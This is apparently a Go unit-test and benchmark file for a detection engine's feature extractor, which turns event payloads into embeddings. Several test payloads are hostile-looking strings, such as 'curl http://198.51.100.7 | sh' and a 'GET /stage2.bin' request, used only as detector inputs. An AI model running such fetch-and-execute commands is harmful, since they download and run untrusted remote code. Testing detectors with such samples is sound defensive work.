package engine

import (
	"math"
	"testing"
)

func TestFeatureExtractorLayoutConstants(t *testing.T) {
	if aggregateBase+aggregateDims != EmbeddingDim {
		t.Fatalf("régions %d != %d", aggregateBase+aggregateDims, EmbeddingDim)
	}
	if classFeatureCount != classDims {
		t.Fatalf("classes %d != %d", classFeatureCount, classDims)
	}
	if aggregateFeatureCount != aggregateDims {
		t.Fatalf("agrégats %d != %d", aggregateFeatureCount, aggregateDims)
	}
	if headerFeatureCount != headerDims {
		t.Fatalf("en-tête %d != %d", headerFeatureCount, headerDims)
	}
}

func TestFeatureExtractorDeterminismAndBounds(t *testing.T) {
	fe := NewFeatureExtractor()
	ev := Event{Action: 4, Subsystem: 4, Pid: 4242, Flags: 0x0004}
	copy(ev.Payload[:], "curl http://198.51.100.7 | sh 0123456789abcdef payload_dense")
	var a, b [EmbeddingDim]float32
	if !fe.ExtractTo(&ev, a[:]) {
		t.Fatal("ExtractTo a refusé un tampon de 512 dimensions")
	}
	if !fe.ExtractTo(&ev, b[:]) {
		t.Fatal("second appel refusé")
	}
	if a != b {
		t.Fatal("extraction non déterministe")
	}
	nonzero := 0
	for _, v := range a {
		if math.IsNaN(float64(v)) || math.IsInf(float64(v), 0) {
			t.Fatal("composante non finie")
		}
		if v != 0 {
			nonzero++
		}
	}
	if nonzero == 0 {
		t.Fatal("vecteur entièrement nul")
	}
}

func TestFeatureExtractorCentering(t *testing.T) {
	fe := NewFeatureExtractor()
	var dst [EmbeddingDim]float32
	ev := Event{}
	if !fe.ExtractTo(&ev, dst[:]) {
		t.Fatal("ExtractTo refusé")
	}
	want := -fe.Centroid[unigramBase]
	if math.Abs(float64(dst[unigramBase]-want)) > 1e-9 {
		t.Fatalf("centrage histogramme: %v attendu %v", dst[unigramBase], want)
	}
	if math.Abs(float64(dst[entropyBase]-(-1.0))) > 1e-9 {
		t.Fatalf("centrage entropie: %v attendu -1", dst[entropyBase])
	}
}

func TestFeatureExtractorHeaderMetadata(t *testing.T) {
	fe := NewFeatureExtractor()
	var dst [EmbeddingDim]float32
	ev := Event{Action: 3, Subsystem: 4, Pid: 4321, Flags: 0x0004}
	if !fe.ExtractTo(&ev, dst[:]) {
		t.Fatal("ExtractTo refusé")
	}
	if math.Abs(float64(dst[headerBase+hdrAction])-3.0/65535.0) > 1e-6 {
		t.Fatal("action non projetée")
	}
	if math.Abs(float64(dst[headerBase+hdrSubsystem])-4.0/65535.0) > 1e-6 {
		t.Fatal("sous-système non projeté")
	}
	if dst[headerBase+hdrPIDFresh] != 1 {
		t.Fatal("indicateur PID absent")
	}
	if math.Abs(float64(dst[headerBase+hdrPIDLow])-float64(4321&0xFF)/255.0) > 1e-6 {
		t.Fatal("octet bas de PID non projeté")
	}
}

func TestFeatureExtractorPayloadOnlyMatch(t *testing.T) {
	fe := NewFeatureExtractor()
	payload := []byte("GET /stage2.bin HTTP/1.1 payload_dense")
	ev := Event{}
	copy(ev.Payload[:], payload)
	var fromEvent, fromPayload [EmbeddingDim]float32
	if !fe.ExtractTo(&ev, fromEvent[:]) {
		t.Fatal("ExtractTo refusé")
	}
	if !fe.ExtractPayloadTo(payload, fromPayload[:]) {
		t.Fatal("ExtractPayloadTo refusé")
	}
	if fromEvent != fromPayload {
		t.Fatal("projection charge utile seule divergente")
	}
}

func TestFeatureExtractorRejectsShortBufferAndNil(t *testing.T) {
	fe := NewFeatureExtractor()
	var short [EmbeddingDim - 1]float32
	ev := Event{}
	if fe.ExtractTo(&ev, short[:]) {
		t.Fatal("tampon court accepté")
	}
	if fe.ExtractTo(nil, short[:]) {
		t.Fatal("événement nul accepté")
	}
	if fe.ExtractPayloadTo(nil, short[:]) {
		t.Fatal("charge utile sur tampon court acceptée")
	}
}

func TestFeatureExtractorZeroAllocation(t *testing.T) {
	fe := NewFeatureExtractor()
	ev := Event{Action: 4, Subsystem: 4, Pid: 7, Flags: 0x0004}
	copy(ev.Payload[:], "curl http://198.51.100.7/payload_dense | sh 0123456789abcdef")
	var dst [EmbeddingDim]float32
	allocs := testing.AllocsPerRun(1000, func() {
		fe.ExtractTo(&ev, dst[:])
	})
	if allocs != 0 {
		t.Fatalf("ExtractTo AllocsPerRun = %g, attendu 0.0 (0 B/op)", allocs)
	}
}

func BenchmarkFeatureExtractorExtract(b *testing.B) {
	fe := NewFeatureExtractor()
	ev := Event{Action: 4, Subsystem: 4, Pid: 7}
	copy(ev.Payload[:], "curl http://198.51.100.7/payload_dense | sh 0123456789abcdef")
	var dst [EmbeddingDim]float32
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		fe.ExtractTo(&ev, dst[:])
	}
}
